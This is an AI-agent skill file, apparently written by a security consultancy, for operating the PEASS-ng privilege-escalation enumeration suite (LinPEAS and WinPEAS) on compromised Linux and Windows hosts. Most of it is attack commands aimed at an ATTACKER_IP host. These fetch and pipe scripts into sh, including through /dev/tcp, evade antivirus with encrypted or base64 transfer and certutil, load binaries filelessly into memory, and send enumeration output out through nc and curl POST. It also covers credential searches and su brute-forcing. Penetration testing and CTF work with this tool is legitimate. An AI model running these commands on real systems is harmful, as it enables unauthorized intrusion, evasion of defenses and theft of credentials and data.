---
name: peass-ng
description: >
  Operate PEASS-ng (Privilege Escalation Awesome Scripts SUITE) — the industry-standard
  post-exploitation enumeration toolkit covering LinPEAS and WinPEAS. Use when performing
  local privilege escalation on Linux, Windows, or macOS targets, when the user asks about
  PEASS, linpeas.sh, winpeas.exe, or winpeas.bat, or when the user needs to enumerate a
  compromised host for PE vectors. Covers installation, all execution methods (curl-to-bash,
  in-memory, AV bypass, certutil), output color interpretation, key checks, flags, quiet/stealth
  mode, targeted check selection, and integration with privilege escalation methodology.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/peass-ng/PEASS-ng
---

# peass-ng Agent Skill

## When to Use This Skill

Use this skill when:
- The user has a shell on a target and needs to enumerate local privilege escalation paths
- The user asks about linpeas.sh, winpeas.exe, winpeas.bat, or the PEASS suite
- Working on CTF boxes or real engagements requiring post-exploitation enumeration
- The user needs to transfer and execute PE scripts while avoiding AV detection
- The user asks how to interpret PEASS output colors or prioritize findings

## What PEASS-ng Does

PEASS-ng is the go-to post-exploitation enumeration suite for identifying local privilege escalation paths across Linux, Windows, and macOS. LinPEAS (linpeas.sh) runs on Unix-like systems and checks hundreds of misconfigurations, SUID/SGID binaries, kernel vulnerabilities, writable paths, cron jobs, stored credentials, and more — all color-coded by criticality. WinPEAS (winpeas.exe / winpeas.bat) performs the equivalent deep enumeration on Windows, covering token privileges, service misconfigs, unquoted service paths, AlwaysInstallElevated, credential stores, and browser-saved passwords.

## Installation and Acquisition

### Latest Release (preferred)

```bash
# Download directly from GitHub releases (always latest)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ota.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
```

### Script Variants (LinPEAS)

| Variant | Description |
|---|---|
| `linpeas.sh` | Default — all checks, embeds linux-exploit-suggester |
| `linpeas_fat.sh` | All checks plus third-party tools embedded as base64 |
| `linpeas_small.sh` | Most important checks only, smallest footprint |
| `linpeas_linux_amd64` | Compiled binary (no bash dependency) |

### WinPEAS Variants

| Variant | Description |
|---|---|
| `winPEASany_ota.exe` | .NET any-CPU, obfuscated (OTA = over-the-air obfuscation) |
| `winPEASany.exe` | .NET any-CPU, requires .NET >= 4.5.2 |
| `winPEASx64.exe` | 64-bit only binary |
| `winPEASx86.exe` | 32-bit only binary |
| `winPEAS.bat` | Pure batch script — works without .NET |
| `winPEAS.ps1` | PowerShell version |

## LinPEAS: Execution Methods

### Direct Execution (shell access)

```bash
# From disk
chmod +x linpeas.sh && ./linpeas.sh

# Curl to bash (no disk write)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# From your attack box HTTP server
curl http://ATTACKER_IP:8000/linpeas.sh | sh
python3 -m http.server 8000   # run on attacker

# Via netcat (no HTTP server needed)
# Attacker:
sudo nc -q 5 -lvnp 80 < linpeas.sh
# Victim:
cat < /dev/tcp/ATTACKER_IP/80 | sh
```

### Execute from Memory and Capture Output

```bash
# Attacker: receive output
nc -lvnp 9002 | tee linpeas.out

# Victim: run in memory, pipe results back
curl http://ATTACKER_IP:8000/linpeas.sh | sh | nc ATTACKER_IP 9002
```

### Output to File (preserve colors for later review)

```bash
./linpeas.sh -a > /dev/shm/linpeas.txt   # /dev/shm lives in RAM only
less -r /dev/shm/linpeas.txt              # view with ANSI colors intact
```

### AV Bypass Methods

```bash
# AES-256 encrypted transfer
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypass -in linpeas.sh -out lp.enc
python3 -m http.server 80
# On victim:
curl ATTACKER_IP/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypass | sh

# Base64 encoded
base64 -w0 linpeas.sh > lp.enc
python3 -m http.server 80
# On victim:
curl ATTACKER_IP/lp.enc | base64 -d | sh
```

## LinPEAS: CLI Flags

```
-a     All checks (+ process monitoring 1min, file hash search, user brute-force)
-e     Extra enumeration (slower, deeper checks)
-r     Regex API key search across entire filesystem
-s     Superfast + stealth (skip slow checks, write nothing to disk)
-q     Do not show banner
-N     Do not use colours (useful for log files)
-w     Wait for user input between check blocks
-D     Debug: show checks that found nothing and timing info
-P <pass>   Password to use with sudo -l and user brute-force
-o <checks> Run only selected checks (comma-separated, see below)
-d <IP/CIDR> Local network host discovery via fping/ping
-p <ports> -d <IP/CIDR>  Host + port discovery via nc
-i <IP> [-p <ports>]  Scan single IP with nc (default: nmap top 1000)
-t     Full network scan + internet connectivity (writes to files)
-F <LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT>  Port forwarding
-f <FOLDER>  Firmware/directory analysis mode
-L     Force Linux execution
-M     Force macOS (macpeas) execution
-h     Show help
```

### Targeted Check Selection (-o flag)

```bash
./linpeas.sh -o system_information,users_information,interesting_files
./linpeas.sh -o procs_crons_timers_srvcs_sockets,network_information
```

Available check categories:
- `system_information` — kernel, OS, sudo version, SELinux, env
- `container` — Docker, LXC, namespace detection
- `cloud` — AWS/GCP/Azure metadata endpoints
- `procs_crons_timers_srvcs_sockets` — running processes, cron jobs, sockets
- `network_information` — interfaces, routes, iptables, listening ports
- `users_information` — sudo rights, groups, last logins, PGP keys
- `software_information` — installed packages, SUID/SGID, capabilities
- `interesting_files` — writable dirs, backup files, credentials in files
- `api_keys_regex` — hundreds of API key patterns (requires `-r`)

## LinPEAS: Output Color Coding

| Color | Meaning |
|---|---|
| **Red/Yellow** | 99% PE vector — investigate immediately |
| **Red** | Suspicious configuration — likely exploitable |
| **Green** | Known good configuration (name-based, not content-verified) |
| **Blue** | Users without shell / mounted devices |
| **Light Cyan** | Users with shell |
| **Light Magenta** | Current username |

**Workflow**: Focus exclusively on Red/Yellow findings first. Red alone = high-value misconfig. Red/Yellow together = near-certain privilege escalation path.

## LinPEAS: Key Checks Performed

- **SUID/SGID binaries**: `find / -perm -4000` / `find / -perm -g=s -type f`
- **Capabilities**: `getcap -r /` — look for `cap_setuid`, `cap_dac_override`, `cap_net_raw`
- **Sudo rights**: `sudo -l` — no-password entries, wildcard paths, env_keep abuse
- **Writable paths in $PATH**: allows PATH hijacking for SUID binary abuse
- **Cron jobs**: `/etc/cron*`, `/var/spool/cron/`, anacron, systemd timers
- **Kernel version**: fed to linux-exploit-suggester (embedded) for known CVEs
- **Stored credentials**: `password|passw` search in `/home`, `/etc`, `/var/www`, `/var/log`
- **Service misconfigurations**: writable service binaries, writable init scripts
- **Writable `/etc/passwd`**: direct root account injection
- **NFS no_root_squash exports**: `/etc/exports`
- **Docker group membership**: container escape to root
- **Readable `/etc/shadow`**: offline password cracking
- **Process monitoring**: captures processes running during enumeration window (with `-a`)
- **User brute-force**: `su` with top-2000 password list (with `-a`)

## WinPEAS: Execution Methods

### Download and Run

```powershell
# Direct execution
.\winPEASany_ota.exe

# certutil download (common AV bypass)
certutil -urlcache -split -f http://ATTACKER_IP/winpeas.exe winpeas.exe
.\winpeas.exe

# PowerShell WebClient download
(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP/winpeas.exe','winpeas.exe')
.\winpeas.exe

# Invoke-WebRequest
iwr -Uri http://ATTACKER_IP/winpeas.exe -OutFile winpeas.exe; .\winpeas.exe
```

### In-Memory Execution (fileless)

```powershell
# Load and execute directly from remote URL (no disk write)
$url = "http://ATTACKER_IP/winPEASany_ota.exe"
$wp = [System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest $url -UseBasicParsing | Select-Object -ExpandProperty Content))
[winPEAS.Program]::Main("")

# Pass arguments in-memory
[winPEAS.Program]::Main("userinfo servicesinfo")

# Load from disk into memory (bypass some AV)
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("C:\Temp\winpeas.exe")))
[winPEAS.Program]::Main("")

# Base64 from disk
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\winpeas.exe")) | Out-File -Encoding ASCII C:\Temp\winpeas.txt
$thecontent = Get-Content -Path C:\Temp\winpeas.txt
$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
[winPEAS.Program]::Main("")
```

## WinPEAS: CLI Arguments

```
winpeas.exe                         # All checks (default, noisy)
winpeas.exe -h                      # Help
winpeas.exe notcolor                # Disable color output (for log capture)
winpeas.exe domain                  # Include domain enumeration
winpeas.exe wait                    # Pause between tests (interactive review)
winpeas.exe debug                   # Verbose debug output
winpeas.exe log                     # Write output to out.txt
winpeas.exe -lolbas                 # Add LOLBAS binary search (slow)
winpeas.exe -linpeas=http://IP/linpeas.sh  # Also run LinPEAS in WSL

# Selective checks (pass space-separated check names)
winpeas.exe systeminfo userinfo
winpeas.exe servicesinfo applicationsinfo
winpeas.exe windowscreds filesinfo
```

### WinPEAS Check Categories

| Category | Key Findings |
|---|---|
| `systeminfo` | Kernel version, Watson CVEs, UAC level, LAPS, LSA protection, Credential Guard, AMSI, AppLocker |
| `userinfo` | Token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege), autologon creds, RDP sessions |
| `servicesinfo` | Modifiable services, writable registry `binPath`, unquoted service paths, DLL hijacking in PATH |
| `applicationsinfo` | Installed software, autorun entries, scheduled tasks, drivers |
| `networkinfo` | Shares, mapped drives, listening ports, firewall rules, DNS cache |
| `windowscreds` | Vault, Credential Manager, DPAPI masterkeys, Kerberos tickets, AlwaysInstallElevated, WiFi passwords, SCCM |
| `browserinfo` | Chrome/Firefox/IE saved passwords, history credentials |
| `filesinfo` | Unattended install files, SAM/SYSTEM backups, GPP passwords, cloud credential files, Putty sessions, SSH keys in registry |

### WinPEAS Color Coding

| Color | Meaning |
|---|---|
| **Red** | High-value finding for a pentester (investigate immediately) |
| **Green** | Well-configured / defender-favorable setting |

## Common Workflows

### CTF/HTB Rapid Enumeration

```bash
# Linux — fastest path to findings
curl http://ATTACKER_IP:8000/linpeas.sh | sh 2>/dev/null | tee /dev/shm/lp.txt
# Review immediately: grep -E "RED|95%|99%" or use less -r

# Windows — from web delivery
$wp=[System.Reflection.Assembly]::Load([byte[]](iwr "http://ATTACKER_IP/winPEASany_ota.exe" -UseBasicParsing | Select -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

### Stealth / Restricted Engagement

```bash
# Linux stealth: no disk writes, no brute-force, fast
curl http://ATTACKER_IP:8000/linpeas.sh | sh -s -- -s -q 2>/dev/null

# Windows: fileless, no color (for quiet capture)
[winPEAS.Program]::Main("notcolor log")
```

### Targeted Follow-Up After Initial Triage

```bash
# After reading initial output, focus on specific weak areas
./linpeas.sh -o procs_crons_timers_srvcs_sockets,interesting_files

# Deep API key search (on developer machines)
./linpeas.sh -r

# Full intensive scan (CTF / full-permission engagement)
./linpeas.sh -a -r
```

### Output Capture and Exfil

```bash
# Save Linux output with colors (for offline review)
./linpeas.sh -a -N > /tmp/.lp_$(date +%s).txt
# Exfil via POST
curl -X POST http://ATTACKER_IP:4444/ --data-binary @/tmp/.lp_*.txt

# Windows output to file
winpeas.exe log    # writes out.txt in CWD
```

## Advanced Techniques

### Firmware / Container Analysis

```bash
# Analyze a mounted firmware image
bash linpeas.sh -f /mnt/firmware

# Run inside chroot
cp linpeas.sh /mnt/linpeas.sh
chroot /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex
```

### Piping into Grep for Speed

```bash
# Show only Red/Yellow lines (likely PE vectors)
curl http://ATTACKER_IP/linpeas.sh | sh 2>/dev/null | grep -E "\[9[0-9]m|\[1;31m|\[1;33m"

# Extract SUID binaries only
./linpeas.sh -o software_information 2>/dev/null | grep -i "suid\|sgid"
```

### WinPEAS with Obfuscated Binary (AV evasion)

```powershell
# Use the OTA (obfuscated) variant
$url = "http://ATTACKER_IP/winPEASany_ota.exe"
$wp = [System.Reflection.Assembly]::Load([byte[]](iwr $url -UseBasicParsing | Select -ExpandProperty Content))
$ep = $wp.EntryPoint   # obfuscated ReflectedType name may differ
$ep.Invoke($null, @([string[]]@("")))
```

## Integration with Privilege Escalation Methodology

1. **Get a shell** → transfer LinPEAS/WinPEAS via least-detectable method
2. **Run fast first pass** (`-s -q` on Linux, `notcolor` on Windows) to find quick wins
3. **Triage Red/Yellow** → cross-reference with GTFOBins (Linux) or LOLBAS (Windows)
4. **Pivot on token privileges** (Windows SeImpersonatePrivilege → PrintSpoofer/GodPotato)
5. **Follow up** with targeted checks: `linpeas.sh -o procs_crons_timers_srvcs_sockets`
6. **Document findings** from `out.txt` or captured output before exploitation

### Key Resources Referenced by PEASS-ng

- **GTFOBins** — Unix binary abuse: `https://gtfobins.github.io`
- **LOLBAS** — Windows binary abuse: `https://lolbas-project.github.io`
- **HackTricks PE** — `https://book.hacktricks.wiki/linux-hardening/privilege-escalation`
- **Watson** — embedded in WinPEAS for Windows CVE detection
- **linux-exploit-suggester** — embedded in linpeas.sh for kernel exploit suggestions

## Troubleshooting

| Issue | Fix |
|---|---|
| Colors not rendering | Use `less -r` or `cat -v`; try `export TERM=xterm-256color` |
| `Permission denied` on linpeas.sh | `chmod +x linpeas.sh` or run with `sh linpeas.sh` |
| Very slow execution | Use `-s` flag (stealth/superfast), or `-o` to target specific checks |
| WinPEAS blocked by AV | Use OTA obfuscated variant or in-memory PowerShell load |
| WinPEAS colors not showing | Run in Windows Terminal or ConEmu; cmd.exe has limited ANSI support |
| `no such file or directory` on binary | Ensure correct arch variant (x64 vs x86 vs any) |
| `su` brute-force lockout risk | Do NOT use `-a` on systems with account lockout policies |
| Output garbled in log | Pass `notcolor` to WinPEAS; `-N` to LinPEAS |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [How to Attack-Test Your Own Domain Controllers Before an Adversary Does](https://redhound.us/attack-test-domain-controllers)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
